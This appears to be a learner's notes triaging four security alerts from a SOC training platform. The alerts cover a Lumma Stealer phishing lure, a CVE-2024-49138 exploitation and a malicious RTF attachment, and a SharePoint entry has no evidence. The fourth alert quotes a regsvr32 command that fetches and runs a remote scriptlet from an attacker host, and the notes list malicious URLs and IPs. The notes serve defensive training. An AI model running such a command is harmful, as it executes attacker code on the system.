**Alert  #1**

**Date:** 2025-03-13

**Alert Title:** Data leakage 

**Severity:** Critical

**Source IP:** 172.16.17.216

**Target:** dylan@letsdefend.io

**Hypothesis:** Redirected site contains a click fix type script for Lumma Stealer distribution.

**Evidence:** 
- On 2025-03-13 9:44AM our host IP address " 172.16.17.216" user name " Dylan" was sent a malicious email . The subject of the email was "Upgrade your system to Windows 11 Pro for FREE" . It was suspected to have Lumma Stealer content .
- Lumma Stealer (or LummaC2) is a prominent information-stealing malware sold via a Malware-as-a-Service (MaaS) model on underground forums since 2022. It targets Windows systems to harvest sensitive data like browser credentials, cookies, crypto wallets, and 2FA extensions, often acting as an initial access vector for larger attacks.
- Our client is currently using Window 10 . So he must have been tricked into opening the link thinking it was legitimate as it was sent made looking like it was sent from Microsoft. The link was redirected to a malicious link "https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4" . "mshta.exe" is an built in Microsoft utility which is used to run HTML application. We learned that the user opened the malicious link on Mar 13 2025 23:26:20 PM . Lastly we observed that the link was communicating with 172.67.139.19 . This IP address has been flagged as assosiated to Lumma Stealer .

**Classification:** True positive - Malicious 

**Action Taken:** -Deleted the email from the user mail
-Marked it as contained 

**Time to triage:** 15mins 



**Alert #2**

**Date:** 2025-01-22

**Severity:** Medium 

**Source IP:** 172.16.17.207

**Target:** Victor

**Hypothesis:** Unusual or suspicious patterns of behavior linked to the hash have been identified, indicating potential exploitation of CVE-2024-49138.

**Evidence:** 
-The SOC335 alert revealed a true positive exploitation attempt of CVE-2024–49138. 
-An attacker leveraged PowerShell to download and execute a malicious payload (svohost.exe) from an S3 bucket, bypassing detection by mimicking a legitimate Windows process. The file was executed under SYSTEM privileges, confirming escalation.
-Further, attacker IP 185.107.56[.]141 successfully brute-forced the victim system over RDP, followed by C2 server communication.
OR
-On Jan 22 2025 on 2:37AM our system was send an SIEM alert containing CVE 2024-49138 Exploitation Detection .
-The endpoint 172.16.17.207 was observed showing suspicious sign of exploitation and tampering . We examined the endpoint and found a malicious suspected executable "svohost.exe". 
-The suspected executable was trying to act like a real executable named "svchost.exe" . 
-The suspected executable was contained in "C:\Windows\Temp\". 
-There was a suspicious malicious IP address "185.107.56.141" which has an address of C2/Netherland . It was suspected to be an brute force attack. 
-The endpoint then ran command to utilize conhost.exe by including "\??\"  which bypass a normal file path resolution .
-They also forced the use of older conhost.exe by enforcing -ForceV1 in the command .
-We contained the hash file for redemption . 

**Classification:** True positive - Malicious 

**Action taken:** 

**Time to triage:** 20mins 



**Alert #3**

**Date:** 2025-07-22

**Severity:** Critical 

**Source IP:** 107.191.58.76

**Target:** SharePoint01

**Hypothesis:** Suspicious unauthenticated POST request targeting ToolPane.aspx with large payload size and spoofed referer indicative of CVE-2025-53770 exploitation.

**Evidence:** 



**Alert #4**

**Date:** 2025-02-04 

**Severity:** Critical

**Source IP:** 84.38.130.118 //smtp ip address

**Target:** Austin@letsdefend.io

**Hypothesis:** Malicious RTF attachment identified with known CVE-2025-21298 exploit pattern.

**Evidence:** 
-On 2025-02-04 6:18:08 AM our host "Austin" was sent an email containing suspicious malicious  attachment "mail.rtf". 
-The subject of the email was "Important: Action Required for Upcoming Project Deadline". 
-The SMTP address of the sender "84.38.130.118" was found to be malicious with C2/Latvia , which belonged to SIA RixHost .
-The source address from "projectmanagement@pm.me" with an IP address  "185.70.42.45" was found to be suspicious . 
-The hash address from which it was send was found to be malicious and belonged to contained mail.rtf . Attackers have historically used RTF documents to deliver or trigger malicious content. 
-The given command "regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll" was found suspicious and an indicator of regsvr32.exe abuse . 

**Action taken:** We have contained the action for further assessment and deleted the email from the host mail.

**Time of triage:** 20mins 





















